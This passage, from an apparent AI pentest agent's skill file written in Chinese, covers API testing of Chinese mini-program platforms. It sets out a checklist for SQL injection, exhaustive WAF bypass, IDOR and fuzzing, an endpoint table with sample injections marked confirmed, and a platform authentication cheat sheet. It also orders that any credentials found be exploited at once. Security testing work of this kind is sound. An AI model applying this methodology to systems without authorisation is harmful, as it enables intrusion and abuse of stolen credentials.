□ [零认证端点单独验证] /login /auth /wechat 类无认证路径是否单独测试了 SQLi？
  → 这类端点连签名都不要，注入门槛最低 → 必须排在矩阵首位

□ [CRUD 全覆盖] 每个发现的服务，同服务增删改查是否全测？
  → 有服务只测了 query，未测 add/update/delete → 回去补

□ [参数无语义偏见] SQLi 矩阵中是否包含 openId/unionId/appid/card_no 等"系统字段"？
  → 没有 → 回去补（铁律A）

□ [SQLi 矩阵完成度] 矩阵中是否有 [测试状态=✗] 的行？
  → 有 → 先补测，不准输出交接表

□ [WAF 绕过完整性] 遇到 WAF 拦截时，是否穷举了 BENCHMARK/大小写/编码等绕过层？
  → 只尝试了1-2个 payload 就放弃 → 回去补（铁律B）

□ [SQLi 首漏扩展] 确认第一个注入后，是否对所有其他字符串参数横扫了一遍？
  → 没有 → 回去执行 Phase E（铁律C）

□ [参数移植] 每个接口的响应字段是否作为其他接口参数候选测试过？
  → 有接口未产出「响应字段池」记录 → 该接口未完成，回去补

□ [Fuzz 深度] 每个关键参数是否达到 ≥ 20 变体？
  → 没有 → 继续 Fuzz，不准停

□ [多 ID 验证] IDOR 发现是否经过 ≥ 3 个不同 ID 的验证？
  → 只有单点证据 → 补验证，否则 validate 7 问无法通过

□ [凭证利用链] 发现的所有 Token/AK/SK/签名密钥是否完成完整利用链？
  → 有凭证未利用 → 禁止输出报告

□ [首漏扩展] 确认的每个漏洞是否横向扩展到同类端点？
  → 有漏洞未扩展 → 回去执行 Step 6

□ [负面控制] 每个发现是否有「正常防护情况（403/401/400/504）」的对比请求？
  → 无负面控制 → validate 会驳回，补上

□ [遗漏感知] 如果重新审计一遍，最可能在哪里发现新漏洞？
  → 说得出来 → 先去测那里再输出
```

**以上任何一项为"否" → 先补测，再输出交接表。**

---

## 输出：【端点交接表】

**Write 工具写入 `{appid}_endpoints.md`，供下游 skill 消费。**

```
格式（每行一端点）：
  [functionId或URL] | [全部参数(含位置和类型)] | [isNeedLogin] | [认证要求] | [注入优先级] | [SQLi测试状态]

参数类型标注：
  str = 字符串（SQLi候选）
  num = 数字（SQLi候选，数字上下文）
  path = 路径参数（独立列行）
  hidden = 从响应/错误/extConfig发现的隐藏参数

示例：
  /wechat/login              | body:appid(str),body:jscode(str)       | N/A  | 无认证     | P0-SQLi   | appid✅confirmed(lt_weixin)
  /member/coupon/list        | body:open_id(str),body:page(num)       | true | 签名(已知) | P0-SQLi   | open_id✅confirmed(club_open)
  /corp/groupchat/query      | body:unionid(str),body:merchant_code   | true | 签名(已知) | P0-SQLi   | unionid✅confirmed(lt_weixin)
  /market/rule/recharge      | body:card_no(str),body:member_id(num)  | true | 签名(已知) | P0-SQLi   | card_no✅confirmed(club_open)
  hishop_cbff_address_list   | body:pin(str),body:pageNo(num)         | false| 无认证     | P0-IDOR   | pin⬜未测
  hishop_cbff_order_submit   | body:orderId(num),body:amount(num)     | true | pt_key     | P1        | -

标记规则（SQLi列）：
  ✅confirmed(dbname) = 注入已确认，数据库名已提取
  ⬜未测 = 在矩阵中但尚未测试
  ❌WAF绕过失败 = 所有绕过层均尝试，无信号
  🚫无注入信号 = 20+变体无异常响应
```

---

## 平台认证速查表

| 平台 | 主认证 Token | 网关模式 | isNeedLogin:false 时丢弃的字段 | 签名机制 |
|------|-------------|---------|-------------------------------|---------|
| 京东系 | `pt_key`（JD SSO） | CBFF（functionId 路由） | pt_key / lsySession / lsyPin / x-jnos-token | 无（网关级认证） |
| 微信自有 | `session_key` + `openId` | 直连 REST | Authorization / custom-token | 无或自建 |
| 自建签名系 | 无session，仅签名 | 直连 REST | 无（签名本身就是认证） | MD5/HMAC(merchantCode+ts+key+body) |
| 美团系 | `mtToken` | MTThrift/HTTP | mtToken | 无 |
| 拼多多 | `anti_token` | Gateway | 用户凭证字段 | 无 |
| 通用自建 | `access_token`/`Bearer` | REST | Authorization | 无 |

---

## 完成后移交

- SQLi 已确认 → `Skill(skill="validate")` → `Skill(skill="report")`（不等 sqli skill，本 skill 已完成核心测试）
- P0/P1 未授权发现 → `Skill(skill="validate")` → `Skill(skill="report")`
- IDOR 候选 → `Skill(skill="idor")`
- 硬编码凭证利用链未完整 → `Skill(skill="auth-bypass")`
- 含 URL/域名参数的端点 → `Skill(skill="ssrf")`
- 支付/限购/竞态 → `Skill(skill="business-logic")`
- SQLi 已有信号但 WAF 绕过未穷尽 → `Skill(skill="sqli")` 深度处理

---

## 禁止事项

- 禁止使用真实用户 pin/openId 以外的身份发起写操作
- 禁止将提取的 API Key 用于生产环境调用（超过验证所需量）
- 禁止修改他人数据（IDOR 验证只读，确认权限后立即停止）
- 禁止带着未利用的凭证切换步骤（凭证发现 = 立即利用链）
- 禁止因"openId/unionId 看起来是系统生成的"而跳过 SQLi 测试（铁律A）
- 禁止 WAF 拦截第一个 payload 后就标注"无注入"（铁律B）
- 禁止确认第一个注入后直接写报告而不横扫同批参数（铁律C）
